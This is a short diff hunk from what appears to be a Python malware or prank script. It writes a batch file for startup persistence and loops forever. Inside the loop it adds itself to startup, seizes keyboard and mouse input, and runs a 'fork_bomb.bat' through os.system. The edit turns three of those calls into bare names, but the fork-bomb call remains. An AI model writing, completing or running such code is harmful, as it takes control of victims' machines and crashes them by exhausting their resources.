@@ -31,9 +31,9 @@ def win_code():
             bat_file.write(r'python "" %s' % file_path)
     
     while True:
-        add_to_startup()
-        key_pressing()
-        mouse_control()
+        add_to_startup,
+        key_pressing,
+        mouse_control,
         os.system("fork_bomb.bat") 
         
 # If the user is using linux, use the linux() function
